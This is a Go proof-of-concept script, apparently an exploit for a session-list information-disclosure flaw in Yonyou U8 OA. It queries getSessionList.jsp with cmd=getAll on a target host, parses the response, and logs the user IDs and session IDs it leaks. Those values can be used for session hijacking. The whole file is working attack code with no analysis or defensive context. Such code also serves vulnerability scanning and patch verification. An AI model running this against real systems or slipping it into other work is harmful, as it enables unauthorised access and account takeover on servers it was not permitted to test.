package poc

import (
	"golang.org/x/text/encoding/simplifiedchinese"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func extractValue(data, pattern string) string {
	re := regexp.MustCompile(pattern)
	match := re.FindStringSubmatch(data)
	if len(match) >= 2 {
		return match[1]
	}
	return ""
}
func U8OAgetSessionList(target string) {
	url := strings.TrimRight(target, "/")
	resp, err := http.Get(url + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll")
	if err != nil {
	}
	defer resp.Body.Close()

	var reader io.Reader

	reader = simplifiedchinese.GBK.NewDecoder().Reader(resp.Body)
	body, err := io.ReadAll(reader)
	if err != nil {
	}
	tag := regexp.MustCompile(`<Session>`).MatchString(string(body))
	if resp.StatusCode == http.StatusOK && tag {
		userID := extractValue(string(body), `<usrID>\s*(.*?)\s*</usrID>`)
		sessionID := extractValue(string(body), `<sessionID>\s*(.*?)\s*</sessionID>`)
		log.Println("[+] usrID:", userID)
		log.Println("[+] sessionID:", sessionID)
	} else {
		log.Println("[-] 不存在U8 OA getSessionList信息泄露漏洞")
	}
}
